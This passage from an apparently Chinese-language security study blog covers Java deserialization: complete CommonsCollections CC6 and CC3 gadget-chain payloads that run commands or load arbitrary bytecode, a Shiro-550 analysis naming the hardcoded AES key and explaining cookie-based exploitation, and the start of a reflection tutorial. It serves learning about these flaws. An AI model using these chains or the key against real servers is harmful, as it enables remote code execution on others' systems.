class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry a = <span class="keyword">new</span> <span class="function">TiedM	<span class="title">apEntry</span><span class="params">(lazyMap, <span class="string">&quot;aaa&quot;</span>)</span></span>;</span><br><span class="line">        HashMap&lt;Object, Object&gt; b = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        b.put(a, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="comment">//为了防止在序列化时就调用整个链子因此对lazyMap进行反射，令刚开开始的值不为chainedTransformer，之后通过反射在修改为chainedTransformer，从而达到在序列化时不会利用整个链子</span></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryfield = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryfield.set(lazyMap,chainedTransformer);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//使得在序列化时put调用时给lazyMap添加的值删掉</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(b);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.yongsheng.site/2022/01/26/CommonsCollections-6/">参考</a></p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>利用另一种方法  类的动态加载</p>
<p>在类加载时，我们需要利用、</p>
<p>Classloader-&gt;findClass-&gt;defineClass-&gt;Templateslmp（调用newinstance类）- &gt;getTransletInstance()</p>
<p>由于在Templateslmp类内部有三个方法调用，因此我们逐个分析，然后发现第三个可以较好利用</p>
<p><img src="https://img-blog.csdnimg.cn/9894ce67eb414e2f92b38cc9bd44a0c4.png#pic_center"></p>
<p>由于在第三个中存在newinstance,可以初始化</p>
<p><img src="https://img-blog.csdnimg.cn/c4cdce0d99fc43df9b2b67aae34412c2.png#pic_center"></p>
<p>因此选择这个比较合适</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        Field tfactoryField = tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="https://img-blog.csdnimg.cn/c378ae6bb59f4c29959bcba2f7464594.png#pic_center"></p>
<p>大致思路：</p>
<p><img src="https://img-blog.csdnimg.cn/ffcd9d7bf6a449349a393b5cb860db84.png#pic_center"></p>
<p> 这种方法可以用于Runtime被过滤时候使用</p>
<p>还有<strong>另一种方法</strong>，当我们不想使用InvokeTransform时，我们可以考虑利用下面的这个链子</p>
<p><img src="https://img-blog.csdnimg.cn/80e78c15d2994c44889f76188740674c.png#pic_center"></p>
<p>paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\text\\class\\text.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">//        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">//        tfactoryField.setAccessible(true);</span><br><span class="line">//        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line">//        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">//                new ConstantTransformer(templates),</span><br><span class="line">//                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">//        &#125;;</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(1);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line">//        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.yongsheng.site/2022/01/30/CommonsCollections-3/">参考</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/17/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">shiro550反序列化漏洞分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-17</time><div class="content"><h2 id="shiro简介"><a href="#shiro简介" class="headerlink" title="shiro简介"></a>shiro简介</h2><p>Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。</p>
<p>Shiro提供了应用程序安全性API来执行以下方面：</p>
<p>身份验证：证明用户身份，通常称为用户登录</p>
<p>授权：访问控制</p>
<p>密码术：保护或隐藏数据以防窥视；</p>
<p>会话管理：每个用户的时间敏感状态。</p>
<p>Shiro还支持一些辅助功能，例如Web应用程序安全性，单元测试和多线程支持，它们的存在也是为了加强上述四个方面。</p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>当 shiro 版本 &lt;1.2.5时，主要是由shiro 的 rememberMe 内容 反序列化 导致的命令执行漏洞，造成的原因是 AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行</p>
<p>在我们勾选rememberme登陆后，刷新，抓包，将其 JSESSIONID 删除，使 shiro 验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了）</p>
<p>简单介绍利用：<br>通过在cookie的rememberMe字段中插入恶意payload，<br>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。<br>shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==<br>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>编辑器：IDEA 2021<br>java版本：jdk8u65<br>Server版本 : Tomcat 8.5.81<br>shiro版本：shiro-root-1.2.4<br><a target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">shiro环境搭建</a><br>tomcat官网下载即可</p>
<h2 id="shiro导入"><a href="#shiro导入" class="headerlink" title="shiro导入"></a>shiro导入</h2><p>下载好以后直接解压<br>然后偷偷的进入samples/web目录，直接修改pom文件，主要修改下面这些</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--  这里需要将jstl设置为<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="tomcat导入"><a href="#tomcat导入" class="headerlink" title="tomcat导入"></a>tomcat导入</h3><p><img src="https://img-blog.csdnimg.cn/156750a0756b447485c57dbdee736246.png"></p>
<h3 id="war包导入"><a href="#war包导入" class="headerlink" title="war包导入"></a>war包导入</h3><p><img src="https://img-blog.csdnimg.cn/e425712ecc704a33bb2c21483f562568.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h3><p>我们要研究的是开启RememberMe后登录的过程，所以从org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin处开始即可，这里是判断是否开启RememberMe然后开始操作的地方<br><img src="https://img-blog.csdnimg.cn/ab003e68b1194cdab5a631a992685e08.png"><br>这里先清除认证信息，然后通过isRememberMe()判断是否有认证信息，也就是是否开启了RememberMe选项框，跟进rememberIdentity()方法<br><img src="https://img-blog.csdnimg.cn/218e474555fd4829a6aa38432e486991.png"><br>首先调用getIdentityToRemember函数来获取用户身份(用户root)，接着跟进rememberIdentity构造方法<br><img src="https://img-blog.csdnimg.cn/020f0e15d8c84698985b62911dccc7b2.png"><br>其实convertPrincipalsToBytes方法将accountPrincipals（也就是用户root)转换为字节形式，我们可以跟进研究一下<br><img src="https://img-blog.csdnimg.cn/ef4dc6a1fe8f40ff9c2b41903ef9b645.png"><br>这里将Principals(用户root)序列话后进行encrypt加密，跟进encrypt函数<br><img src="https://img-blog.csdnimg.cn/a4d182e34b6a46a1afcbf9b26674f9ed.png"><br>具体怎么分析加密，他与解密时一样，这里不在分析<br>加密完成后我们继续返回跟进rememberSerializedIdentity<br><img src="https://img-blog.csdnimg.cn/8f8830585343417088be4c6a7fff7bf5.png"><br>base64编码后，设置到cookie中，其实到这里就是存入的全部流程，序列化—&gt;AES加密—&gt;base64编码—&gt;设置到cookie中的rememberme字段。</p>
<h3 id="解密方式"><a href="#解密方式" class="headerlink" title="解密方式"></a>解密方式</h3><p>利用账号密码登录，找到getRememberedSerializedIdentity()函数<br>根据该函数名称这个函数是得到反序列化之后的cookie值的函数<br><img src="https://img-blog.csdnimg.cn/dc4ba7241dda4215b2d4b6b632a9e2d8.png"><br>找到调用这个函数的函数getRememberedPrincipals()<br><img src="https://img-blog.csdnimg.cn/b651165dd2ba45bf93b63109d874ee15.png"><br>发现如果byte不为空则进入convertBytesToPrincipals函数，跟进<br><img src="https://img-blog.csdnimg.cn/e89d5b2c3d9b4fb097bcc1472fabc114.png"><br>返现其先解密在进行反序列化<br>跟进解密（这里跟进了几次）<br><img src="https://img-blog.csdnimg.cn/f2a6700ad3884ee2bf2618371478b742.png"><br>发现参数存在密文和key，推测是对称密钥，之后在跟进发现为aes算法，key为固定的密钥<br><img src="https://img-blog.csdnimg.cn/e6a8c93460974aeaa2dcbfdca7b4fb8a.png"><br>跟进序列化发现存在readObject，判断只要存在commons collections拓展，我们就可以利用cc链进行漏洞利用<br><img src="https://img-blog.csdnimg.cn/48c641a4ebd14836b34317d229a20d9e.png"><br>解密的流程到这就结束了，读取cookie中的rememberMe—&gt;base64解码—&gt;AES解密—&gt;反序列化</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>（在实战中一般我们无法较好的利用cc，仅能较好的利用cb）<br>利用就是改rememberMe，我们可以将我们构造的payload进行aes加密在传递，在传递时，一定要将 JSESSIONID删除，具体aes加密就不再演示</p>
<p>Shiro反序列化漏洞目前为止有两个，Shiro-550(Apache Shiro &lt; 1.2.5)和 Shiro-721( Apache Shiro &lt; 1.4.2 )</p>
<p>主要区别在于</p>
<blockquote>
<p>Shiro550使用已知密钥撞</p>
<p>Shiro721是使用登录后rememberMe={value}去爆破正确的key值进而反序列化，</p>
<p>对比Shiro550条件只要有足够密钥库（条件比较低）、Shiro721需要登录（要求比较高鸡肋）</p>
<p>Apache Shiro &lt; 1.4.2默认使用AES/CBC/PKCS5Padding模式</p>
<p>Apache Shiro &gt;= 1.4.2默认使用AES/GCM/PKCS5Padding模式</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/14122843.html">大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89/">Java反序列化学习（一）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-07</time><div class="content"><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><p>反射例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//或取实例化对象</span></span><br><span class="line">        person a = <span class="keyword">new</span> person();</span><br><span class="line">        Class c = a.getClass();</span><br><span class="line">        Constructor personcConstructor = c.getConstructor(String.class,<span class="keyword">int</span>.class);</span><br><span class="line">        <span class="comment">//getConstructor()方法用于返回一个Constructor对象，该对象反映此Class对象表示的类的给定公共构造方法</span></span><br><span class="line">        person p = (person) personcConstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">21</span>);</span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span class="line">        <span class="comment">//或取类中属性</span></span><br><span class="line">        <span class="comment">// Field [] personFields = c.getDeclaredFields();</span></span><br><span class="line">        <span class="comment">// for(Field f:personFields)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// Field namefield = c.getField(&quot;name&quot;);</span></span><br><span class="line">        <span class="comment">// namefield.set(p,&quot;xinxin&quot;);</span></span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span 